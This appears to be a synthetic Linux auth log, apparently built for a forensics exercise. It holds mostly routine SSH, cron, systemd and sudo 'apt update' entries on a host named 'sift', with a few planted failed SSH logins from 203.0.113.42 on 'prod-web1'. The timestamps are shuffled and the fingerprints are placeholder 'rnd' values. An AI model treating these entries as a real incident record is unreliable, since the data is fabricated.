Mar 15 08:17:32 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:38:58 sift systemd-logind[5173]: New session 442 of user manager.
Mar 15 15:04:54 sift sshd[13129]: Accepted publickey for admin from 10.0.1.121 port 53335 ssh2: RSA SHA256:rnd
Mar 15 08:24:32 sift sshd[8937]: Accepted publickey for analyst from 10.0.1.132 port 48297 ssh2: RSA SHA256:rnd
Mar 15 13:27:25 sift systemd[1]: Started Session 107 of User manager.
Mar 15 08:53:57 sift systemd[1]: Started Session 1 of User guest.
Mar 15 13:45:29 sift systemd[1]: Started Session 87 of User intern2.
Mar 15 08:14:13 sift systemd[1]: Started Session 130 of User intern2.
Mar 15 11:42:17 sift sshd[19718]: Accepted publickey for guest from 10.0.1.107 port 60274 ssh2: RSA SHA256:rnd
Mar 15 12:36:37 sift sshd[6287]: Accepted publickey for manager from 10.0.1.30 port 62554 ssh2: RSA SHA256:rnd
Mar 15 15:45:13 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:14:43 sift CRON[9565]: pam_unix(cron:session): session closed for user root
Mar 15 14:27:19 sift CRON[7001]: pam_unix(cron:session): session closed for user root
Mar 15 09:59:13 sift systemd-logind[13189]: New session 356 of user intern2.
Mar 15 12:37:51 sift CRON[16038]: pam_unix(cron:session): session closed for user root
Mar 15 14:22:08 sift systemd-logind[4910]: New session 21 of user developer.
Mar 15 15:03:16 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:51:27 sift systemd[1]: Started Session 325 of User intern2.
Mar 15 12:30:52 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:24:37 sift systemd[1]: Started Session 305 of User guest.
Mar 15 13:57:09 sift systemd[1]: Started Session 485 of User manager.
Mar 15 14:15:46 sift systemd-logind[16421]: New session 69 of user admin.
Mar 15 15:54:45 sift CRON[2940]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:10:33 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:35:04 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:09:23 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:10:07 sift CRON[29592]: pam_unix(cron:session): session closed for user root
Mar 15 08:52:53 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:39:04 sift sshd[17501]: Accepted publickey for analyst from 10.0.1.174 port 60930 ssh2: RSA SHA256:rnd
Mar 15 08:49:17 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:25:42 sift CRON[20419]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:27:17 sift CRON[28922]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:00:54 sift CRON[28321]: pam_unix(cron:session): session closed for user root
Mar 15 13:46:33 sift sshd[13265]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 15:11:01 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:58:41 sift CRON[7474]: pam_unix(cron:session): session closed for user root
Mar 15 09:25:20 sift sshd[23991]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 13:48:51 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:54:51 sift systemd-logind[29913]: New session 47 of user admin.
Mar 15 15:50:16 sift systemd-logind[24798]: New session 110 of user intern1.
Mar 15 09:16:44 sift CRON[16119]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:09:04 sift CRON[21657]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:27:56 sift sshd[27829]: Accepted publickey for analyst from 10.0.1.63 port 61395 ssh2: RSA SHA256:rnd
Mar 15 15:26:12 sift systemd[1]: Started Session 332 of User developer.
Mar 15 11:25:01 sift CRON[26435]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:09:13 sift systemd[1]: Started Session 201 of User intern2.
Mar 15 15:26:37 sift sshd[21161]: Accepted publickey for intern2 from 10.0.1.4 port 53197 ssh2: RSA SHA256:rnd
Mar 15 10:40:59 sift systemd-logind[2452]: New session 268 of user admin.
Mar 15 10:04:33 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:33:54 sift systemd-logind[5491]: New session 129 of user intern1.
Mar 15 14:37:22 sift sshd[22199]: Accepted publickey for manager from 10.0.1.50 port 40596 ssh2: RSA SHA256:rnd
Mar 15 09:01:08 sift systemd[1]: Started Session 371 of User developer.
Mar 15 14:28:10 sift systemd-logind[18033]: New session 342 of user guest.
Mar 15 12:18:23 sift CRON[28929]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 09:02:03 sift systemd-logind[10075]: New session 138 of user analyst.
Mar 15 09:49:13 sift systemd[1]: Started Session 12 of User developer.
Mar 15 11:43:28 sift CRON[29152]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:02:00 sift sshd[5706]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 13:18:28 sift systemd-logind[3201]: New session 365 of user guest.
Mar 15 12:00:49 sift sshd[18398]: Accepted publickey for admin from 10.0.1.54 port 58911 ssh2: RSA SHA256:rnd
Mar 15 08:04:35 sift sshd[15428]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 11:21:20 sift CRON[9157]: pam_unix(cron:session): session closed for user root
Mar 15 13:30:26 sift CRON[25644]: pam_unix(cron:session): session closed for user root
Mar 15 10:14:09 sift systemd-logind[28406]: New session 412 of user guest.
Mar 15 12:32:35 sift CRON[24612]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:16:30 sift CRON[7426]: pam_unix(cron:session): session closed for user root
Mar 15 12:39:57 sift sshd[6465]: Accepted publickey for analyst from 10.0.1.101 port 55321 ssh2: RSA SHA256:rnd
Mar 15 14:28:19 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:49:52 sift sshd[5368]: Accepted publickey for developer from 10.0.1.9 port 63781 ssh2: RSA SHA256:rnd
Mar 15 13:32:45 sift sshd[26711]: Accepted publickey for intern2 from 10.0.1.83 port 61243 ssh2: RSA SHA256:rnd
Mar 15 10:27:35 sift CRON[21996]: pam_unix(cron:session): session closed for user root
Mar 15 09:05:35 sift systemd-logind[5785]: New session 126 of user analyst.
Mar 15 10:34:58 sift sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:42:43 sift CRON[22434]: pam_unix(cron:session): session closed for user root
Mar 15 09:43:53 sift systemd-logind[17641]: New session 257 of user manager.
Mar 15 09:07:58 sift systemd-logind[1133]: New session 406 of user analyst.
Mar 15 12:07:20 sift CRON[21191]: pam_unix(cron:session): session closed for user root
Mar 15 09:24:59 sift CRON[17439]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:48:45 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:18:53 sift sshd[5257]: Accepted publickey for intern1 from 10.0.1.97 port 59427 ssh2: RSA SHA256:rnd
Mar 15 13:13:13 sift sshd[10745]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 10:14:55 sift sshd[24273]: Accepted publickey for guest from 10.0.1.46 port 63875 ssh2: RSA SHA256:rnd
Mar 15 13:26:54 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:30:04 sift sshd[13153]: pam_unix(sshd:session): session opened for user guest by (uid=0)
Mar 15 08:49:11 sift sshd[8459]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 10:45:20 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:34:41 sift CRON[17644]: pam_unix(cron:session): session closed for user root
Mar 15 11:32:58 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:57:46 sift CRON[28886]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:18:35 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:24:55 sift sshd[11676]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 08:31:35 sift systemd-logind[3326]: New session 150 of user developer.
Mar 15 09:03:48 sift sshd[14403]: Accepted publickey for guest from 10.0.1.95 port 42789 ssh2: RSA SHA256:rnd
Mar 15 09:02:41 sift sshd[3374]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 14:49:52 sift CRON[5701]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 14:05:20 prod-web1 sshd[12348]: Failed password for invalid user postgres from 203.0.113.42 port 44528 ssh2
Mar 15 08:55:18 sift systemd[1]: Started Session 297 of User intern1.
Mar 15 10:01:32 sift systemd-logind[17588]: New session 403 of user analyst.
Mar 15 15:04:05 sift CRON[16122]: pam_unix(cron:session): session closed for user root
Mar 15 10:18:35 sift systemd-logind[18250]: New session 285 of user manager.
Mar 15 12:01:56 sift sshd[14153]: pam_unix(sshd:session): session opened for user guest by (uid=0)
Mar 15 15:38:23 sift sshd[19449]: Accepted publickey for admin from 10.0.1.74 port 64451 ssh2: RSA SHA256:rnd
Mar 15 11:07:27 sift sshd[11828]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 12:46:10 sift sshd[12933]: Accepted publickey for intern2 from 10.0.1.146 port 43326 ssh2: RSA SHA256:rnd
Mar 15 14:05:18 prod-web1 sshd[12348]: Invalid user postgres from 203.0.113.42 port 44528
Mar 15 12:36:17 sift CRON[25430]: pam_unix(cron:session): session closed for user root
Mar 15 10:30:21 sift systemd[1]: Started Session 445 of User intern1.
Mar 15 11:42:28 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:20:34 sift sshd[14582]: Accepted publickey for developer from 10.0.1.148 port 52908 ssh2: RSA SHA256:rnd
Mar 15 12:52:39 sift CRON[2394]: pam_unix(cron:session): session closed for user root
Mar 15 11:55:34 sift CRON[3833]: pam_unix(cron:session): session closed for user root
Mar 15 12:57:45 sift CRON[18868]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:00:29 sift CRON[14120]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:05:34 sift CRON[7155]: pam_unix(cron:session): session closed for user root
Mar 15 14:44:28 sift systemd-logind[4015]: New session 101 of user intern2.
Mar 15 15:54:05 sift CRON[15421]: pam_unix(cron:session): session closed for user root
Mar 15 09:05:00 prod-web1 sudo:    ops-team : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail syslog
Mar 15 10:40:00 sift CRON[5444]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:05:49 sift systemd-logind[21439]: New session 291 of user admin.
Mar 15 15:26:00 sift sshd[22037]: Accepted publickey for admin from 10.0.1.73 port 52569 ssh2: RSA SHA256:rnd
Mar 15 08:42:06 sift systemd-logind[16371]: New session 475 of user guest.
Mar 15 09:57:03 sift sshd[13723]: pam_unix(sshd:session): session opened for user guest by (uid=0)
Mar 15 12:49:19 sift CRON[22138]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:44:44 sift CRON[6729]: pam_unix(cron:session): session closed for user root
Mar 15 13:36:23 sift CRON[7516]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:25:31 sift sshd[25824]: Accepted publickey for admin from 10.0.1.104 port 51725 ssh2: RSA SHA256:rnd
Mar 15 12:03:16 sift CRON[10378]: pam_unix(cron:session): session closed for user root
Mar 15 09:04:57 sift systemd[1]: Started Session 150 of User analyst.
Mar 15 08:05:31 sift sshd[19194]: Accepted publickey for intern1 from 10.0.1.177 port 47059 ssh2: RSA SHA256:rnd
Mar 15 15:53:35 sift sshd[13269]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 15:49:20 sift sshd[5106]: Accepted publickey for analyst from 10.0.1.129 port 44091 ssh2: RSA SHA256:rnd
Mar 15 15:30:07 sift sshd[25807]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 11:08:19 sift CRON[1397]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 14:14:12 sift CRON[18672]: pam_unix(cron:session): session closed for user root
Mar 15 11:29:01 sift CRON[4295]: pam_unix(cron:session): session closed for user root
Mar 15 12:26:57 sift sshd[13033]: Accepted publickey for admin from 10.0.1.195 port 52638 ssh2: RSA SHA256:rnd
Mar 15 12:15:44 sift CRON[18841]: pam_unix(cron:session): session closed for user root
Mar 15 08:33:59 sift sshd[23850]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 15:08:24 sift systemd-logind[21681]: New session 480 of user analyst.
Mar 15 15:52:06 sift systemd[1]: Started Session 274 of User analyst.
Mar 15 08:33:47 sift systemd[1]: Started Session 396 of User developer.
Mar 15 10:04:36 sift systemd[1]: Started Session 416 of User intern1.
Mar 15 14:05:28 prod-web1 sshd[12349]: Failed password for analyst from 203.0.113.42 port 44532 ssh2
Mar 15 13:23:20 sift CRON[20839]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:08:23 sift sshd[23784]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 15:53:23 sift sshd[5461]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 13:44:55 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:17:58 sift sshd[26548]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 13:04:44 sift sshd[11963]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 11:10:50 sift CRON[5224]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:37:30 sift sshd[6493]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 09:25:32 sift systemd-logind[23073]: New session 44 of user analyst.
Mar 15 08:03:38 sift CRON[19843]: pam_unix(cron:session): session closed for user root
Mar 15 12:40:38 sift sshd[22456]: Accepted publickey for intern1 from 10.0.1.150 port 42028 ssh2: RSA SHA256:rnd
Mar 15 09:54:50 sift systemd-logind[10111]: New session 319 of user intern1.
Mar 15 08:28:20 sift systemd-logind[5659]: New session 287 of user developer.
Mar 15 09:01:16 sift systemd-logind[5792]: New session 57 of user admin.
Mar 15 14:09:25 sift sshd[7457]: Accepted publickey for manager from 10.0.1.10 port 50413 ssh2: RSA SHA256:rnd
Mar 15 15:45:43 sift CRON[11465]: pam_unix(cron:session): session closed for user root
Mar 15 13:55:42 sift systemd-logind[10536]: New session 304 of user guest.
Mar 15 08:31:49 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:59:31 sift CRON[6560]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 14:06:21 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:50:25 sift sshd[3045]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 12:42:10 sift sshd[3516]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 15:58:49 sift systemd-logind[22400]: New session 72 of user admin.
Mar 15 13:04:33 sift sshd[23714]: Accepted publickey for guest from 10.0.1.149 port 62059 ssh2: RSA SHA256:rnd
Mar 15 12:09:16 sift systemd[1]: Started Session 266 of User admin.
Mar 15 15:14:23 sift sshd[28419]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 15:56:34 sift CRON[4623]: pam_unix(cron:session): session closed for user root
Mar 15 15:30:31 sift CRON[26716]: pam_unix(cron:session): session closed for user root
Mar 15 10:54:56 sift sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:21:31 sift systemd-logind[5625]: New session 172 of user admin.
Mar 15 15:09:57 sift systemd[1]: Started Session 180 of User intern1.
Mar 15 15:38:46 sift sshd[5696]: Accepted publickey for intern2 from 10.0.1.171 port 48164 ssh2: RSA SHA256:rnd
Mar 15 13:55:18 sift sshd[11898]: Accepted publickey for intern1 from 10.0.1.76 port 53337 ssh2: RSA SHA256:rnd
Mar 15 12:31:21 sift CRON[10962]: pam_unix(cron:session): session closed for user root
Mar 15 10:00:07 sift CRON[8650]: pam_unix(cron:session): session closed for user root
Mar 15 14:55:15 sift sshd[5763]: Accepted publickey for manager from 10.0.1.174 port 43234 ssh2: RSA SHA256:rnd
Mar 15 15:14:51 sift sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:55:47 sift systemd-logind[5364]: New session 311 of user developer.
Mar 15 15:49:44 sift CRON[24004]: pam_unix(cron:session): session closed for user root
Mar 15 13:33:00 sift CRON[22478]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:16:24 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:49:54 sift sshd[5964]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 08:15:40 sift CRON[2989]: pam_unix(cron:session): session closed for user root
Mar 15 10:42:51 sift sshd[18822]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 14:19:49 sift sshd[3427]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 15 15:36:17 sift sshd[3999]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 12:36:41 sift systemd[1]: Started Session 236 of User intern2.
Mar 15 12:38:19 sift sshd[19790]: Accepted publickey for admin from 10.0.1.103 port 51928 ssh2: RSA SHA256:rnd
Mar 15 08:28:44 sift systemd-logind[9396]: New session 428 of user intern1.
Mar 15 09:50:11 sift sshd[11970]: Accepted publickey for manager from 10.0.1.114 port 59683 ssh2: RSA SHA256:rnd
Mar 15 13:52:23 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:07:15 sift systemd-logind[5993]: New session 213 of user guest.
Mar 15 12:51:52 sift sshd[10358]: Accepted publickey for admin from 10.0.1.123 port 56668 ssh2: RSA SHA256:rnd
Mar 15 10:59:09 sift CRON[4374]: pam_unix(cron:session): session closed for user root
Mar 15 09:31:54 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:43:03 sift systemd-logind[13995]: New session 22 of user intern1.
Mar 15 15:05:03 sift systemd[1]: Started Session 491 of User admin.
Mar 15 10:22:31 sift sshd[4484]: Accepted publickey for manager from 10.0.1.191 port 55806 ssh2: RSA SHA256:rnd
Mar 15 11:15:59 sift sshd[7804]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 15 15:01:06 sift CRON[28568]: pam_unix(cron:session): session closed for user root
Mar 15 11:23:28 sift sshd[9822]: Accepted publickey for analyst from 10.0.1.102 port 45005 ssh2: RSA SHA256:rnd
Mar 15 14:59:23 sift systemd-logind[25169]: New session 369 of user intern1.
Mar 15 12:30:31 sift systemd[1]: Started Session 374 of User admin.
Mar 15 12:15:44 sift sshd[19484]: Accepted publickey for admin from 10.0.1.17 port 49327 ssh2: RSA SHA256:rnd
Mar 15 15:57:28 sift sshd[28395]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 12:02:24 sift systemd[1]: Started Session 443 of User admin.
